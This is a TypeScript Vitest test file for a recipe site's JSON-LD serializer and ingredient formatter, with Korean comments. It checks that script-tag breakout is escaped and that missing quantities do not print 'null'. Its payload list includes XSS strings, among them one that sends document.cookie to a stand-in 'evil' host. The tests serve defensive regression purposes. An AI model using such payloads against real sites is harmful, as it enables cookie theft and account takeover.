import { describe, it, expect } from 'vitest';
import { serializeJsonLd, formatJsonLdIngredient } from '@/lib/recipes/jsonLd';

// 2026-10-04 [TT-28] JSON-LD 저장형 XSS 차단 · [PHR-10] "소금 null" 수정 — 회귀 고정.

function recipeLd(fields: { name: string; description: string; ingredients: string[]; steps: string[] }) {
  return {
    '@context': 'https://schema.org',
    '@type': 'Recipe',
    name: fields.name,
    description: fields.description,
    author: { '@type': 'Person', name: 'cook' },
    prepTime: 'PT5M',
    recipeYield: '2인분',
    recipeIngredient: fields.ingredients,
    recipeInstructions: fields.steps.map((text, i) => ({ '@type': 'HowToStep', position: i + 1, text })),
    aggregateRating: { '@type': 'AggregateRating', ratingValue: '4.5', ratingCount: 2, bestRating: 5, worstRating: 1 },
  };
}

describe('serializeJsonLd — [TT-28] script 탈출 차단', () => {
  const payloads = [
    'x</script><script>fetch("//evil?c="+document.cookie)</script>',
    'x</SCRIPT><svg onload=alert(1)>',
    'x</ScRiPt >',
    '<!--<script>',
    '<<</script/',
  ];

  it.each(payloads)('출력에 `<` 가 남지 않음(`</script` 대소문자 무관 0건): %s', (p) => {
    const out = serializeJsonLd(recipeLd({ name: p, description: p, ingredients: [p], steps: [p] }));
    expect(out).not.toMatch(/<\/script/i);
    expect(out).not.toContain('<');
  });

  it.each(payloads)('JSON.parse(출력) 이 원 객체와 deepEqual: %s', (p) => {
    const obj = recipeLd({ name: p, description: `설명 ${p}`, ingredients: ['소금 1 g', p], steps: ['끓인다', p] });
    expect(JSON.parse(serializeJsonLd(obj))).toEqual(obj);
  });

  it('`<` 없는 일반 한글·영문 레시피는 JSON.stringify 와 바이트 동일', () => {
    const samples = [
      recipeLd({ name: '김치찌개', description: '돼지고기 & 묵은지 — "얼큰"하게', ingredients: ['김치 300 g', '소금'], steps: ['볶는다 5분', '끓인다'] }),
      recipeLd({ name: 'Mac & Cheese', description: "Kids' favorite > everything", ingredients: ['macaroni 200 g'], steps: ['Boil 10 min'] }),
      recipeLd({ name: '줄바꿈\n탭\t유니코드 \u2028 \u2029 이모지 🍳', description: '', ingredients: [], steps: [] }),
    ];
    for (const s of samples) {
      expect(serializeJsonLd(s)).toBe(JSON.stringify(s));
    }
  });

  it('`<` 는 \\u003c 로만 바뀐다 (그 외 바이트 동일)', () => {
    const obj = { name: 'a<b' };
    expect(serializeJsonLd(obj)).toBe('{"name":"a\\u003cb"}');
    expect(serializeJsonLd(obj).replace(/\\u003c/g, '<')).toBe(JSON.stringify(obj));
  });
});

describe('formatJsonLdIngredient — [PHR-10]', () => {
  // 옛 식 — 수량이 있는 정상 경로는 출력이 같아야 한다
  const legacy = (name: string, quantity: unknown, unit: string | null) => {
    const displayUnit = (unit && unit !== '선택') ? unit : '';
    return `${name} ${quantity} ${displayUnit}`.trim();
  };

  it('수량 있는 정상 경로는 옛 출력과 동일', () => {
    const cases: [string, number | string, string | null][] = [
      ['소금', 1, 'g'], ['물', 1, 'cup'], ['김치', 300, 'g'], ['달걀', 2, '개'],
      ['설탕', 0.5, '큰술'], ['고춧가루', 0, 'g'], ['양파', 1, null], ['마늘', 3, '선택'],
      ['간장', '1/2', '컵'], [' 앞공백', 1, 'g'], ['뒤공백 ', 2, 'ml'],
    ];
    for (const [n, q, u] of cases) {
      expect(formatJsonLdIngredient(n, q, u)).toBe(legacy(n, q, u));
    }
  });

  it('수량 null/빈값 → "null" 없이 이름(+단위)만', () => {
    expect(formatJsonLdIngredient('소금', null, null)).toBe('소금');
    expect(formatJsonLdIngredient('소금', null, '선택')).toBe('소금');
    expect(formatJsonLdIngredient('소금', undefined, '약간')).toBe('소금 약간');
    expect(formatJsonLdIngredient('후추', '', 'g')).toBe('후추 g');
    expect(formatJsonLdIngredient('소금', null, null)).not.toContain('null');
  });
});
